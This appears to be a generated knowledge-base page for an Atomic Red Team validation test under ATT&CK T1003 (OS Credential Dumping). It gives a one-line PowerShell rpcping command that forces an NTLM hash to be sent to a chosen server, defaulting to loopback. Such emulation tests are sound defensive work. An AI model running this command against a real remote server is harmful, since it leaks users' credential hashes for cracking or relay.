---
atomic_guid: "0b207037-813c-4444-ac3f-b597cf280a67"
title: "Send NTLM Hash with RPC Test Connection"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003"
attack_technique_name: "OS Credential Dumping"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "0b207037-813c-4444-ac3f-b597cf280a67"
  - "Send NTLM Hash with RPC Test Connection"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Send NTLM Hash with RPC Test Connection

RpcPing command can be used to send an RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process. 
Ref: https://twitter.com/vysecurity/status/974806438316072960

## Metadata

- Atomic GUID: 0b207037-813c-4444-ac3f-b597cf280a67
- Technique: T1003: OS Credential Dumping
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1003/T1003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003]]

## Input Arguments

### custom_port

- description: Specify the custom port number
- type: integer
- default: 1234

### server_ip

- description: Specify the server IP address. If not specified, the loop back IP will be used
- type: string
- default: 127.0.0.1

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml)
